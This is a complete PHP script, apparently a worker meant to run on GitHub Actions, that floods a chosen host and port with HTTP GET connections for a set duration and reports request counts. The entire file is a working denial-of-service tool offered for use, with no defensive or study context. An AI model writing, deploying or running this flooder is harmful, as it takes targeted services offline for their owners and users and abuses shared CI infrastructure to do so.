<?php
// language: PHP, file: worker.php
// *GitHub Actions flood worker. Connect, send GET, close.*

if ($argc < 4) {
    echo "usage: php worker.php <target> <port> <duration_seconds>\n";
    exit(1);
}

$target   = $argv[1];
$port     = (int)$argv[2];
$duration = (int)$argv[3];
$end      = time() + $duration;

$request = "GET / HTTP/1.1\r\n" .
           "Host: $target\r\n" .
           "User-Agent: " . str_repeat('A', rand(20, 80)) . "\r\n" .
           "Accept: */*\r\n" .
           "Connection: Keep-Alive\r\n\r\n";

$count  = 0;
$errors = 0;

while (time() < $end) {
    $sock = @fsockopen($target, $port, $errno, $errstr, 1);
    if ($sock) {
        stream_set_blocking($sock, false);
        @fwrite($sock, $request);
        @fclose($sock);
        $count++;
    } else {
        $errors++;
    }
}

echo "DONE: requests=$count errors=$errors\n";
